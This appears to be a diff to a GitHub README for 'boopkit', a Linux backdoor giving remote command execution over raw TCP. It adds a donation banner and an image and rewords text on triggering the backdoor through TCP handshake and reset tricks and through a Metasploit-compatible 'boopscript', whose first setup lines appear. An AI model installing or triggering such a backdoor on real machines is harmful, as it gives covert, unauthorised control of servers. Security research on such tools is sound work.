@@ -1,3 +1,12 @@
+---
+
+Please help me become an independent programmer by donating directly below.
+
+[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/D1D8CXLHZ) 
+
+---
+
+
 ```
 ================================================================
 
@@ -52,6 +61,8 @@ Remote command execution over raw TCP.
 > This is **NOT** an exploit! This requires prior privileged access on a server in order to work!
 > I am a professional security researcher. These are white hat tools used for research purposes only.
 > Use this responsibly. Never use this software illegally.
+
+![FSpgEXTacAYme8t](https://user-images.githubusercontent.com/13757818/168698377-9c1125d6-698d-4009-a599-56b275b54764.jpeg)
 
 ## Server Side
 
@@ -154,13 +165,14 @@ The 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP rese
 
 Either of these tactics are enough to independently trigger boopkit.
 Various network hardware and runtime conditions will make either tactic more viable.
-Boopkit will try both, by default.
+Boopkit will try both, and respond to both by default.
 
 # Boopscript
 
-The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed locally.
+The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed on a remote Linux machine.
 
 ```bash
+# boopscript
 RHOST="127.0.0.1"
 RPORT="22"
 LHOST="127.0.0.1"
